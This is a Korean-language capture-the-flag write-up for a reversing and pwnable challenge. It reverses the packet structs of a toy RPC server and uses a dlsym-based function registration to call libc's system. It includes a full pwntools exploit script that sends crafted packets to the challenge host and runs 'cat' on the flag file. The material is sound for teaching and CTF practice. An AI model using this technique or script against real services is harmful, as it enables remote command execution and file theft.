# cRPC v1

# Usage

# Concept
- Packet Struct Analysis, Reversing, dlsym to Function add, execute

# Writeup

이 문제는 Reversing과 Pwnable 요소가 결합된 문제입니다. 간단한 RPC(Remote Procedure Call) 개념을 바탕으로 출제되었습니다. 

RPC에 대해 간단히 소개하자면, RPC는 Remote Procedure Call의 약자로, 한 컴퓨터에서 실행 중인 프로그램이 네트워크를 통해 다른 컴퓨터에서 실행 중인 프로그램의 기능을 호출하는 프로토콜입니다. Server와 Client 간에 정의된 인터페이스의 함수를 통해 Stub이 중간자 역할로 패킷을 pack/unpack 해주는 역할을 합니다.

컨셉은 사용자가 중간 Stub 역할을 하며, 패킷 구조를 리버싱해서 exploit하는 것입니다. 

Request/Response 패킷 구조와 패킷 타입은 다음과 같은 구조체로 이루어져 있습니다:

```c
typedef struct {
    uint32_t header;
    uint8_t type;
    uint32_t request_id;
    char* func_name;
    uint32_t name_length;
    char name[32];
    uint32_t param_length;
    char params[256];
} RequestMessage;

typedef struct {
    uint32_t length;
    uint8_t type;
    uint32_t request_id;
    uint8_t status;
    uint32_t result_length;
    char result[256];
} ResponseMessage;

enum type {
    ERROR = 0x01,
    REGISTER,
    UNREGISTER,
    PING,
    PONG,
    EXECUTE
};
```

여기서 중요한 부분은 `register_function`입니다. 사용자는 `REGISTER` 타입(2번)을 통해 함수를 등록할 수 있으며, `EXECUTE` 타입(6번)을 통해 해당 함수를 실행할 수 있습니다. 

```c
void __fastcall register_function(const char *a1)
{
  int v1; // ebx

  if ( func_count > 9 )
  {
    fwrite("Error: Maximum number of functions reached\n", 1uLL, 0x2BuLL, stderr);
  }
  else
  {
    v1 = func_count;
    *((_QWORD *)&func_list + 2 * v1) = strdup(a1);
    qword_6068[2 * func_count] = (void (__fastcall *)(__int64, char *))dlsym(0LL, a1);
    if ( qword_6068[2 * func_count] )
    {
      ++func_count;
    }
    else
    {
      fprintf(stderr, "Error: Function %s not found\n", a1);
      free(*((void **)&func_list + 2 * func_count));
    }
  }
}
```

`dlsym` 함수는 공유 객체에서 심볼을 찾으면 해당 주소를 반환하는 함수입니다. 함수 정의는 다음과 같습니다:

```c
#include <dlfcn.h>

void *dlsym(void *handle, const char *symbol);
```

프로그램 내에는 `handle_echo`, `handle_reverse`, `handle_write`, `handle_open`, `handle_read`, `handle_write` 등의 함수가 있지만, 이를 통해서는 exploit을 원활히 수행할 수 없습니다. 그러나 프로그램이 동적 링크로 컴파일되어 있다는 점을 이용해 `libc`에서 `system` 함수를 불러와 실행하면 원하는 명령을 수행할 수 있습니다.

```py
from pwn import *

context.log_level = 'debug'
# p = process('./crpc')
p = remote('realsung.kr', 18181)

'''
typedef struct {
    uint32_t header;
    uint8_t type;
    uint32_t request_id;
    char* func_name;
    uint32_t name_length;
    char name[32];
    uint32_t param_length;
    char params[256];
} RequestMessage;

typedef struct {
    uint32_t length;
    uint8_t type;
    uint32_t request_id;
    uint8_t status;
    uint32_t result_length;
    char result[256];
} ResponseMessage;

enum Type{
    ERROR = 0x01,
    REGISTER,
    UNREGISTER,
    PING,
    PONG,
    EXECUTE
};
'''

def request_packet(types, request_id, func_name, params):
    name_length = len(func_name)
    param_length = len(params)

    payload = p32(0xe0f1d2c3)
    payload += p32(types)
    payload += p32(request_id)
    payload += p64(0)
    payload += p32(0) # padding?
    payload += p32(name_length)
    payload += func_name
    payload += b'\x00'*(32-name_length)
    payload += p32(param_length)
    payload += params
    payload += b'\x00'*(256-param_length)
    return payload

payload = request_packet(0x02, 1, b"system", b".")
p.send(payload)
response_message = p.recv(0x1000)
print(hexdump(response_message))
print('-'*0x30)

payload = request_packet(0x06, 1, b"system", b"cat /home/crpc/flag.txt")
p.send(payload)

response_message = p.recv(0x1000)
print(hexdump(response_message))
print('-'*0x30)

p.interactive()
```